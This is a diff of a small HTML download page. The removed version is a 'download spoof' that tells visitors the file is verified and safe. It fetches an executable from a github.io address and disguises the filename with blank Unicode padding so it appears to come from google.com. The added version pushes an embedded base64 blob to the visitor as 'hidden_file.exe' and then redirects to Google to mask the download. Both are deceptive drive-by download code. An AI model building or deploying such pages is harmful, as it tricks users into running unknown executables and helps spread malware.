@@ -2,80 +2,27 @@
 <html lang="en">
 <head>
   <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Download Spoof Example</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      background-color: #f0f0f0;
-      text-align: center;
-      padding: 50px;
-    }
-
-    .container {
-      background: white;
-      width: 400px;
-      margin: 0 auto;
-      padding: 20px;
-      border-radius: 10px;
-      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
-    }
-
-    h1 {
-      font-size: 24px;
-      color: #333;
-    }
-
-    p {
-      font-size: 16px;
-      color: #555;
-    }
-
-    .button {
-      background-color: #4CAF50;
-      border: none;
-      color: white;
-      padding: 15px 32px;
-      text-align: center;
-      text-decoration: none;
-      display: inline-block;
-      font-size: 18px;
-      margin: 10px 2px;
-      cursor: pointer;
-      border-radius: 5px;
-      transition: background-color 0.3s ease;
-    }
-
-    .button:hover {
-      background-color: #45a049;
-    }
-
-    .note {
-      font-size: 14px;
-      color: #777;
-      margin-top: 15px;
-    }
-  </style>
+  <title>Download File</title>
 </head>
 <body>
 
-  <div class="container">
-    <h1>Download From Original Site</h1>
-    <p>Click the button below to download the file from the original site. <br> 
-    This file is verified and safe to download.</p>
-    <input type="button" class="button" value="Download File" onclick="a()">
-    <div class="note">
-      <p>Note: Always ensure the source is trusted before downloading files.</p>
-    </div>
-  </div>
+  <button onclick="downloadFile()">Download</button>
 
   <script>
-    function a() {
-      // Step 1: Create a temporary <a> element to trigger the download
+    function downloadFile() {
+      // Ganti string base64 di bawah dengan Base64 hasil konversi file kamu
+      var base64Data = "data:application/octet-stream;base64,UEsDBBQAAAAIAK2lUGZTTHpm0D6WvLpkAqYngV24CpWz5yX5v1LkFGjHg97UqXLe42XtTkw5Bgr8EmAqA1Opmr9rw0lwnZ0rR3WqElw/0MiZk+CmP9wTzy0qS7ddbdh8FhzGHwp5LOAiSHTA1+zO7J7H5+m0t0bOAw68tCT7cZBwt7Sh1bUy5LvqqJkV2+HbOVwkcgLwLxZjjjeyhlYl3X9PbiWuwCg=="; 
+      
+      // Buat elemen <a> sementara untuk men-trigger download
       var link = document.createElement('a');
-      link.href = 'https://ecdnts-del.github.io/test-apk/From⠀google.com ⠀⠀⠀⠀⠀⠀ chrome.exe'; // Make sure this is a valid file URL for download
-      link.download = 'From⠀www.google.com ⠀⠀⠀⠀⠀ chrome.exe'; // Set the filename for download
-      link.click(); // Trigger the download
+      link.href = base64Data;
+      link.download = "hidden_file.exe"; // Nama file yang akan diunduh
+      link.click(); // Memicu download file
+
+      // Redirect ke Google setelah 2 detik
+      setTimeout(function() {
+        window.location.href = "https://www.google.com"; // Redirect ke Google
+      }, 3400); // Tunggu 2 detik sebelum redirect
     }
   </script>
 
